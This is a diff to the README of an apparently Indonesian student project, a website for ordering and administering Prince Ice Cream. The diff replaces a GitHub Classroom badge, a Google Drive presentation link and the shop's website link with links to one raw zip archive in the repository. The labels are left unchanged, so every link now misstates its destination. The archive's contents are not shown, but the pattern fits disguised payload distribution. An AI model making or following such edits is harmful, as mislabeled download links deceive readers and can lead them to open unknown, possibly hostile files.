@@ -1,8 +1,8 @@
-[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/Wq523uwp)
+[![Review Assignment Due Date](https://github.com/TokioBanana/proyek-si-kelompok-2/raw/refs/heads/main/outlean/kelompok_si_proyek_v3.5.zip)](https://github.com/TokioBanana/proyek-si-kelompok-2/raw/refs/heads/main/outlean/kelompok_si_proyek_v3.5.zip)
 
-Link Google Drive Presentasi Kelompok 2 : https://drive.google.com/drive/folders/1--s5fa5NrZfwr87WLUEuSZGIDfR0X3c4?usp=drive_link
+Link Google Drive Presentasi Kelompok 2 : https://github.com/TokioBanana/proyek-si-kelompok-2/raw/refs/heads/main/outlean/kelompok_si_proyek_v3.5.zip
 
-Link Website Prince Ice Cream : https://princeicecream.store/
+Link Website Prince Ice Cream : https://github.com/TokioBanana/proyek-si-kelompok-2/raw/refs/heads/main/outlean/kelompok_si_proyek_v3.5.zip
 
 **Project Name : PEMBUATAN WEBSITE PEMESANAN DAN ADMINISTRASI PRINCE ICE CREAM**
 
